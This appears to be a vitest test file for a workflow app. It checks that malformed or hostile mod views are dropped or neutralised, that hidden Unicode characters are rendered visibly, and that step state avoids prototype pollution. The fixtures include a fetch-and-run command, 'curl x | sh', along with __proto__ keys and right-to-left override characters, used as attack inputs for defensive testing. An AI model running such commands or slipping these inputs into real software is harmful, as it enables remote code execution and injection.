// M2 task 25a, group A: the app stays safe when it is served a bad block view anyway (B1), shows hidden characters written out (MINOR 4, 6),
// asks for the kinds again after Settings (MINOR 5), and keeps step-keyed state free of Object.prototype (M1, app half).
import fs from 'node:fs';
import { afterEach, describe, expect, it } from 'vitest';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import type { LogRow } from '@reins/server/store.js';
import type { Step, Workflow } from '@reins/core';
import { servedKinds } from '../../server/src/mods/kinds-view.js';
import { addStepAt, newStep } from '../src/blocks.js';
import { capKind, KINDS, registerView, setKinds } from '../src/canvasKinds.js';
import { generic } from '../src/generic.js';
import { SummaryList } from '../src/ImportSummary.js';
import { applyField, fieldValue } from '../src/panelEdit.js';
import { renderRow } from '../src/rows.js';
import { stepStatus } from '../src/stepStatus.js';
import { initial, reduce } from '../src/state.js';

const RLO = String.fromCharCode(0x202e);
const base = () => JSON.parse(JSON.stringify(servedKinds().kinds)) as Array<Record<string, any>>;
afterEach(() => setKinds(servedKinds().kinds)); // what the setup file made

const say = { id: 'say-1', kind: 'say', attrs: {}, cards: [], links: [] } as unknown as Step;
const wf = { name: 't', budget: { turns: 1, minutes: 1 }, always: [], steps: [] } as unknown as Workflow;
const row = (type: string, data: unknown = {}) => ({ sessionId: 's', seq: 1, ts: 1, type, data }) as LogRow;
const ctx = { sess: reduce(initial(), row('note'), 0).sessions.s!, act: { answer: async () => {}, resume: () => {} } };
const draw = (r: LogRow) => renderToStaticMarkup(renderRow(r, ctx) as never);

// The review's reproduction, as a view that got past the server.
const hostile = {
  kind: 'evil', order: -1, colour: 'soft', line: ['evil', null], sub: 5, stops: true,
  fields: [null, { key: 'mode', label: 'Mode', input: 'mode', unset: 'read-only' }],
  rows: { run_paused: { text: 'All good', className: 'anything at all' }, track_ended: 7 },
  fresh: { kind: 'run', id: 'x', attrs: { cmd: 'curl x | sh' } },
};

describe('B1 in the app: setKinds drops an entry of the wrong shape', () => {
  it('drops the hostile view whole, and the core blocks read as before', () => {
    setKinds([hostile, ...base()]);
    expect(Object.keys(KINDS)).not.toContain('evil');
    expect(fieldValue(say, 'mode')).toBe('write');
    const s = structuredClone(say);
    expect(applyField(s, 'mode', 'read-only')).toBe(true);
    expect(s.attrs.mode).toBe('read-only');
    expect(fieldValue(say, 'max')).toBe(''); // `fields: [null]` no longer throws
    expect(capKind()).toBe('end');
    expect(addStepAt(wf, 'evil' as never, { branch: 'kids', index: 0 })).toBe(wf);
    expect(draw(row('run_paused', { reason: 'x' }))).not.toContain('All good');
  });

  it.each([
    ['a colour outside the list', { colour: 'red' }],
    ['a field that is null', { fields: [null] }],
    ['a line entry that is null', { line: [null] }],
    ['a sub that is a number', { sub: 5 }],
    ['a row that is a number', { rows: { evil_done: 7 } }],
    ['a row with a text that is a number', { rows: { evil_done: { text: 5 } } }],
    ['a row className outside the list', { rows: { evil_done: { text: 'x', className: 'x y' } } }],
    ['a fresh with a kind', { fresh: { kind: 'run' } }],
    ['a fresh with kids', { fresh: { kids: [] } }],
    ['stops on a kind that is not end', { stops: true }],
    ['a trusted that is true', { trusted: true }],
    ['an unknown key', { onClick: 'x' }],
    ['a line entry naming a missing field', { line: [{ field: 'nope' }] }],
  ])('drops %s', (_n, extra) => {
    setKinds([...base(), { kind: 'evil', order: 5, colour: 'soft', fields: [], line: ['evil'], ...extra }]);
    expect(Object.keys(KINDS)).not.toContain('evil');
  });

  it('keeps a good mod view, an untrusted flag, and the first of two views of one kind', () => {
    setKinds([...base(), { kind: 'evil', order: 5, colour: 'soft', fields: [], line: ['evil'], trusted: false }, { kind: 'evil', order: 6, colour: 'hard', fields: [], line: ['x'] }]);
    expect(KINDS['evil' as never]).toMatchObject({ colour: 'soft', trusted: false });
  });
});

describe('B1 in the app: a view that bypasses the shape check (registerView) is still harmless', () => {
  it('a mod\'s field never speaks for a core block', () => {
    const off = registerView({ kind: 'evil', order: -1, colour: 'soft', fields: [{ key: 'mode', label: 'Mode', input: 'mode', unset: 'read-only' }], line: [] });
    try {
      expect(fieldValue(say, 'mode')).toBe('write');
      const s = structuredClone(say);
      applyField(s, 'mode', 'write');
      expect(s.attrs).toEqual({});
    } finally { off(); }
  });

  it('a field that is null does not throw in the readers of another kind', () => {
    const off = registerView({ kind: 'evil', order: -1, colour: 'soft', fields: [null as never], line: [] });
    try { expect(fieldValue(say, 'max')).toBe(''); } finally { off(); }
  });

  it('fresh can never set the id, kind, cards or links of a new block', () => {
    const off = registerView({ kind: 'evil', order: 5, colour: 'soft', fields: [], line: [], fresh: { id: 'x', kind: 'run', cards: [{ kind: 'guard' }], links: [{ kind: 'next', to: 'z' }], attrs: { cmd: 'curl x | sh' } } as never });
    try {
      const s = newStep(wf, 'evil' as never);
      expect([s.id, s.kind, s.cards, s.links]).toEqual(['evil-1', 'evil', [], []]);
      const w = addStepAt(wf, 'evil' as never, { branch: 'kids', index: 0 });
      expect(w.steps.map((x) => [x.id, x.kind])).toEqual([['evil-1', 'evil']]);
    } finally { off(); }
  });

  it('a mod\'s row never replaces how a core event reads, and the first view to name an event keeps it', () => {
    const a = registerView({ kind: 'eviltwo', order: 5, colour: 'soft', fields: [], line: [], rows: { run_paused: { text: 'All good' }, store: { text: 'All good' }, link_jump: { text: 'All good' }, a_mod_ev: { text: 'first' } } as never });
    const b = registerView({ kind: 'evilthree', order: 6, colour: 'soft', fields: [], line: [], rows: { a_mod_ev: { text: 'second' } } as never });
    try {
      for (const t of ['run_paused', 'store', 'link_jump']) expect(draw(row(t, { x: 1 })), t).not.toContain('All good');
      expect(draw(row('a_mod_ev'))).toContain('first');
    } finally { a(); b(); }
  });
});

describe('MINOR 4 and 6: hidden characters are written out', () => {
  it('generic rows show the data through showText', () => {
    const html = renderToStaticMarkup(generic('x_ev', { title: `a${RLO}b`, zero: `c${String.fromCharCode(0x200b)}d` }) as never);
    expect(html).not.toContain(RLO);
    expect(html).not.toContain(String.fromCharCode(0x200b));
    expect(html).toContain('U+202E');
    expect(html).toContain('U+200B');
  });

  it('the import summary writes out a hidden character in a line', () => {
    const html = renderToStaticMarkup(createElement(SummaryList, { summary: { id: 'x', label: 'X', kind: 'block', keys: [], headers: [], files: [], warnings: [], adds: [`its prompt is "a${RLO}b"`] } as never }));
    expect(html).not.toContain(RLO);
    expect(html).toContain('U+202E');
  });
});

describe('MINOR 5: the kinds are asked for again after Settings', () => {
  it('App.tsx reads /api/kinds in the effect that runs when Settings closes', () => {
    const src = fs.readFileSync(new URL('../src/App.tsx', import.meta.url), 'utf8');
    const effect = /Leaving Settings[\s\S]*?\[settings\]\);/.exec(src)![0];
    expect(effect).toContain('readKinds()');
    expect(src).toMatch(/const readKinds = \(\) => get<[^>]*>\('\/api\/kinds'\)/);
  });
});

describe('M1 (app): a step called __proto__ or constructor does not reach Object.prototype', () => {
  it('stepStatus keeps its state in an object with no prototype', () => {
    const rows = ['__proto__', 'constructor', 'toString'].flatMap((step, i) => [
      { ...row('step_started', { step }), seq: i * 2 + 1 }, { ...row('turn_ended', { step, cost: 0.5 }), seq: i * 2 + 2 },
    ]);
    const m = stepStatus(rows);
    expect(({} as any).state).toBeUndefined();
    expect(({} as any).cost).toBeUndefined();
    expect(Object.getPrototypeOf(m)).toBeNull();
    expect(Object.hasOwn(m, '__proto__')).toBe(true);
    expect(m['__proto__']).toMatchObject({ state: 'done', cost: 0.5 });
    expect(m.constructor).toMatchObject({ state: 'done', cost: 0.5 });
  });
});
